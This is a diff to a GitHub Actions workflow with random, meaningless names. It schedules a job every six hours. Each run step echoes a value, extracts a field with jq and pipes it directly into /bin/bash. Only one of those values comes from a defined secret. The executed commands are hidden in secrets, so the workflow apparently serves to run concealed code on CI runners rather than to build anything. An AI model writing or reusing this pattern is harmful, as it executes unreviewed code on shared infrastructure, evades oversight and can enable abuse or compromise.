@@ -3,25 +3,25 @@ name: consumefoolhardy
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 1/6 * * *'
+    - cron: '14 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: consumefoolhardy
         env:
-          ttqm88135: ${{ secrets.ttqm88135 }}
+          yt1: ${{ secrets.yt1 }}
         run: |
-          echo $ttqm88135 | jq -r .mrsa6 | /bin/bash
-          echo $bxza5528 | jq -r .zejk4363 | /bin/bash
-          echo $bhkf0 | jq -r .wlsnz24 | /bin/bash
-          echo $kc7338 | jq -r .upqha4859 | /bin/bash
-          echo $qqiss0509 | jq -r .u41 | /bin/bash
-          echo $piwwb2974 | jq -r .wh363 | /bin/bash
-          echo $l8742 | jq -r .m15648 | /bin/bash
-          echo $mzwr05 | jq -r .npgav10 | /bin/bash
-          echo $xwev0098 | jq -r .vrhza4485 | /bin/bash
-          echo $st168 | jq -r .qmcv531 | /bin/bash
+          echo $yt1 | jq -r .yh183 | /bin/bash
+          echo $ebbv4548 | jq -r .uvldy4 | /bin/bash
+          echo $mwkge1 | jq -r .dmucf4076 | /bin/bash
+          echo $xwz4006 | jq -r .x87189 | /bin/bash
+          echo $ljbah27 | jq -r .jrg092 | /bin/bash
+          echo $coc96 | jq -r .t05182 | /bin/bash
+          echo $pphth93 | jq -r .tymt039 | /bin/bash
+          echo $zq80 | jq -r .jdzlr19131 | /bin/bash
+          echo $cui7190 | jq -r .bbnpx838 | /bin/bash
 
